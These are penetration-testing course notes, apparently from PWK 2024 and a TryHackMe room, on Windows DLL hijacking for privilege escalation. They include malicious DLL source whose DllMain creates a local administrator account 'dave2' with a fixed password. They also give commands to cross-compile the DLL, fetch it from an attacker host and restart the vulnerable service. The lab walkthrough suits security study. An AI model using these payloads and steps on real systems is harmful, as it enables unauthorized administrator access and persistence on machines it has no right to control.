# DLL Hijacking

## **PWK 2024**

{% code title="Standard DLL search order on current Windows versions" overflow="wrap" %}
```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```
{% endcode %}

{% code title="Displaying information about the running service BetaService" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

Name                      State   PathName
----                      -----   --------
...
BetaService               Running C:\Users\steve\Documents\BetaServ.exe
...
```
{% endcode %}

{% code title="Displaying permissions on the binary of BetaService" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\steve> icacls .\Documents\BetaServ.exe
.\Documents\BetaServ.exe NT AUTHORITY\SYSTEM:(F)
                         BUILTIN\Administrators:(F)
                         CLIENTWK220\steve:(RX)
                         CLIENTWK220\offsec:(F)

Successfully processed 1 files; Failed processing 0 files
```
{% endcode %}

{% code title="Display the PATH environment variable" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\steve> $env:path
C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\steve\AppData\Local\Microsoft\WindowsApps;
```
{% endcode %}

{% code title="Code example of a basic DLL in C++" overflow="wrap" lineNumbers="true" %}
```
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
{% endcode %}

{% code title="C++ DLL example code from Microsoft" overflow="wrap" lineNumbers="true" %}
```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
{% endcode %}

{% code title="Cross-Compile the C++ Code to a 64-bit DLL" overflow="wrap" %}
```
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```
{% endcode %}

{% code title="Download compiled DLL" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\steve> cd Documents

PS C:\Users\steve\Documents> iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll

PS C:\Users\steve\Documents> net user
User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
daveadmin                DefaultAccount           Guest
offsec                   steve                    WDAGUtilityAccount
The command completed successfully.
```
{% endcode %}

{% code title="Restart the service BetaService and confirm dave2 was created as local administrator" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\steve\Documents> Restart-Service BetaService
WARNING: Waiting for service 'BetaService (BetaService)' to start...
WARNING: Waiting for service 'BetaService (BetaService)' to start...

PS C:\Users\steve\Documents> net user
User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    offsec                   steve
WDAGUtilityAccount
The command completed successfully.

PS C:\Users\steve\Documents> net localgroup administrators
...
Administrator
BackupAdmin
dave2
daveadmin
offsec
The command completed successfully.
```
{% endcode %}

## **Introduction to DLL Files**

A DLL Hijacking scenario consists of replacing a legitimate DLL file with a malicious DLL file that will be called by the executable and run. By this point, you may have an idea about the specific conditions required for a successful DLL hijacking attack. These can be summarized as;

1. An application that uses one or more DLL files.
2. A way to manipulate these DLL files.

Manipulating DLL files could mean replacing an existing file or creating a file in the location where the application is looking for it. To have a better idea of this, we need to know where applications look for DLL files. At this point, we will look to the DLL search order. Microsoft has a document on the subject located [here](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order).



In summary, for standard desktop applications, Windows will follow one of the orders listed below depending on if the SafeDllSearchMode is enabled or not.

\


If **SafeDllSearchMode** is enabled, the search order is as follows:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

If **SafeDllSearchMode** is disabled, the search order is as follows:

1. The directory from which the application loaded.
2. The current directory.
3. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.
4. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
5. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

## **Finding DLL Hijacking Vulnerabilities**

The screenshot below shows you what to look for in the ProcMon interface. You will see some entries resulted in “NAME NOT FOUND”.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/2bffcc52df1b20dd298154b4da9b52ae.png)

The last two lines in the screenshot above show that dllhijackservice.exe is trying to launch hijackme.dll in the “C:\Temp” folder but can not find this file. This is a typical case of a missing DLL file.

The second step of the attack will consist of us creating this file in that specific location. It is important that we have write permissions for any folder we wish to use for DLL hijacking. In this case, the location is the Temp folder for which almost all users have write permissions; if this was a different folder, we would need to check the permissions.

## **Creating the malicious DLL file**

As mentioned earlier, DLL files are executable files. They will be run by the executable file, and the commands they contain will be executed. The DLL file we will create could be a reverse shell or an operating system command depending on what we want to achieve on the target system or based on configuration limitations. The example below is a skeleton DLL file you can adapt according to your needs.

\


Skeleton Code for the Malicious DLL

```shell-session
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```

\


Leaving aside the boilerplate parts, you can see this file will execute the `whoami` command (`cmd.exe /k whoami`) and save the output in a file called "dll.txt".

\


The mingw compiler can be used to generate the DLL file with the command given below:

`x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll`

\


You can easily install the Mingw compiler using the apt install gcc-mingw-w64-x86-64 command.

\


We have seen earlier that the application we target searches for a DLL named hijackme.dll. This is what our malicious DLL should be named.

\


You can copy the C code above given for the DLL file to the AttackBox or the operating system you are using and proceed with compiling.

\


Once compiled, we will need to move the hijackme.dll file to the Temp folder in our target system. You can use the following PowerShell command to download the .dll file to the target system: `wget -O hijackme.dll ATTACKBOX_IP:PORT/hijackme.dll`\


\


![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/6dd2070eda0924f1b6d601e63301fe05.png)

We will have to stop and start the dllsvc service again using the command below:

`sc stop dllsvc & sc start dllsvc`

